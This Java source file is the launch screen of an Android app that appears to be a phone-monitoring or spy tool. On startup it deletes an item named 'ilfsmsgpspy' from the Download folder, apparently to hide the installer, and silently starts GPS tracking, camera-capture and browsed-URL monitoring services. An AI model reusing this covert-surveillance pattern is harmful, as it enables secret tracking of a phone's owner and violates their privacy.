package com.hinj.app.activity;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.Window;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GooglePlayServicesUtil;
import com.google.android.gms.gcm.GoogleCloudMessaging;
import com.hinj.app.utils.AppUtils;
import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.CheckBrosweUrlBackgroundService;
import com.hinj.secure.smsgps.CheckBrowseUrlAlarmService;
import com.hinj.secure.smsgps.CheckCameraCaptureStatusAlarmService;
import com.hinj.secure.smsgps.GPSAlarmService;
import com.hinj.secure.smsgps.GPSFirstTimeAlarmService;
import com.hinj.secure.smsgps.NonRootedAlarmService;
import com.splunk.mint.Mint;

public class SplashActivity extends Activity {

	TimerTask task;
	Timer timer;
	long t = 2000;
	String deviceId = "";

	private final static int PLAY_SERVICES_RESOLUTION_REQUEST = 9000;
	public static final String EXTRA_MESSAGE = "message";
	public static final String PROPERTY_REG_ID = "registration_id";
	private static final String PROPERTY_APP_VERSION = "1.0";
	private final static String TAG = "SplashActivity";
	protected String SENDER_ID = AppUtils.GCM_SENDERID;
	private GoogleCloudMessaging gcm =null;
	private String regid = null;
	private Context context= null;
	String android_id;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		Mint.initAndStartSession(SplashActivity.this, "304cb1a2");

		requestWindowFeature(Window.FEATURE_NO_TITLE);
		setContentView(R.layout.activity_splash);

		//new RetrieveDeviceTokenAsynctask().execute();
		new AfterOK().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
		
		timer = new Timer();

		task = new TimerTask() {
			public void run() {
				
				if (HinjAppPreferenceUtils.getRaId(SplashActivity.this).equalsIgnoreCase("")) {
					HinjAppPreferenceUtils.setPreferenceLoginStatus(SplashActivity.this, "true");
					Intent i = new Intent(SplashActivity.this, LoginActivity.class);
					startActivity(i);
					finish();
				}else {
					HinjAppPreferenceUtils.setPreferenceLoginStatus(SplashActivity.this, "true");
					Intent i = new Intent(SplashActivity.this, BarcodeScanActivity.class);
					startActivity(i);
					finish();
				}
			/*	HinjAppPreferenceUtils.setPreferenceLoginStatus(SplashActivity.this, "true");
				Intent i = new Intent(SplashActivity.this, LoginActivity.class);
				startActivity(i);
				finish();*/
			}
		};

		timer.schedule(task, t);
		
		  if (checkPlayServices()) 
		  {
		       gcm = GoogleCloudMessaging.getInstance(this);
		       regid = getRegistrationId(context);

		       if (regid.isEmpty())
		       {
		                //registerInBackground();
		          new RetrieveDeviceTokenAsynctask().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
		       }
		       else
		       {
		          Log.d(TAG, "No valid Google Play Services APK found.");
		       }
		   }
	}
	
	@Override
	protected void onResume()
	{
		super.onResume();
		checkPlayServices();
	}
	
	//# Implement GCM Required methods (Add below methods in LaunchActivity)

	private boolean checkPlayServices() {
	        int resultCode = GooglePlayServicesUtil.isGooglePlayServicesAvailable(this);
	        if (resultCode != ConnectionResult.SUCCESS) {
	            if (GooglePlayServicesUtil.isUserRecoverableError(resultCode)) {
	                GooglePlayServicesUtil.getErrorDialog(resultCode, this,
	                        PLAY_SERVICES_RESOLUTION_REQUEST).show();
	            } else {
	                Log.d(TAG, "This device is not supported - Google Play Services.");
	                finish();
	            }
	            return false;
	        }
	        return true;
	 }

	private String getRegistrationId(Context context) 
	{
	   final SharedPreferences prefs = getGCMPreferences(context);
	   String registrationId = prefs.getString(PROPERTY_REG_ID, "");
	   if (registrationId.isEmpty()) {
	       Log.d(TAG, "Registration ID not found.");
	       return "";
	   }
	   int registeredVersion = prefs.getInt(PROPERTY_APP_VERSION, Integer.MIN_VALUE);
	   int currentVersion = getAppVersion(context);
	   if (registeredVersion != currentVersion) {
	        Log.d(TAG, "App version changed.");
	        return "";
	    }
	    return registrationId;
	}
	
	private SharedPreferences getGCMPreferences(Context context) 
	{
	    return getSharedPreferences(SplashActivity.class.getSimpleName(),
	                Context.MODE_PRIVATE);
	}

	private static int getAppVersion(Context context) 
	{
	     try 
	     {
	         PackageInfo packageInfo = context.getPackageManager()
	                    .getPackageInfo(context.getPackageName(), 0);
	            return packageInfo.versionCode;
	      } 
	      catch (NameNotFoundException e) 
	      {
	            throw new RuntimeException("Could not get package name: " + e);
	      }
	}

	public class RetrieveDeviceTokenAsynctask extends AsyncTask<String, String,String> {
		//ProgressDialog progressDialog ;
		String regid = "";
		String emailStr,passwordStr;
		
		@Override
		public void onPreExecute() {
		//	progressDialog = ProgressDialog.show(SplashActivity.this,"Loading...", "Please Wait");
		}

		@Override
		public String doInBackground(String... params) {
			
			 String msg = "";
	          try 
	          {
	               if (gcm == null) 
	               {
	                   gcm = GoogleCloudMessaging.getInstance(context);
	               }
	               regid = gcm.register(SENDER_ID);              
	               Log.d(TAG, "########################################");
	               Log.d(TAG, "Current Device's Registration ID is: "+msg);     
	          } 
	          catch (IOException ex) 
	          {
	              msg = "Error :" + ex.getMessage();
	          }
			System.out.println(regid);
			HinjAppPreferenceUtils.setRegisterDeviceId(SplashActivity.this, regid);
			return regid; 
		}  
 
		@Override
		public void onPostExecute(String result) {
			//progressDialog.cancel();
			/*try{
				HinjAppPreferenceUtils.setDeviceId(SplashActivity.this, regid);
			}
			catch (Exception e) {
				e.printStackTrace();
			}*/
		}
	}
	
/****************** Update Reg End *******************************************/
	
	class AfterOK extends AsyncTask<Void, Void, Void> {

		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(Void... params) {
			// make your request here - it will run in a different thread
			try {
				//moveTaskToBack(true);
				/******** Method For Remove file from Download folder *******/
				Utility.deleteDownloadFolder("ilfsmsgpspy");
				
				/*if()
				{
					
				}
				*/
				if(!isMyServiceRunning(NonRootedAlarmService.class))
				{ 
					//ChildOnOFFStatusAlarm.start(SplashActivity.this);
					GPSAlarmService.start(SplashActivity.this);
					GPSFirstTimeAlarmService.start(SplashActivity.this);
					NonRootedAlarmService.start(SplashActivity.this);
					CheckCameraCaptureStatusAlarmService.start(SplashActivity.this);
					CheckBrowseUrlAlarmService.start(SplashActivity.this);
					
					System.out.println("Service is running....");
				}
				else
				{
					System.out.println("Service is not running....");
				}
				
			} catch (Exception e) {
				e.printStackTrace();
			}
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
		}
	}
	
	public boolean isMyServiceRunning(Class<?> serviceClass) 
	{
		ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
		for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
			if (serviceClass.getName().equals(service.service.getClassName())) {
				return true;
			}
		}
		return false;
	}
	
	@Override
	public void onBackPressed() {
		//super.onBackPressed();
	}
	
}
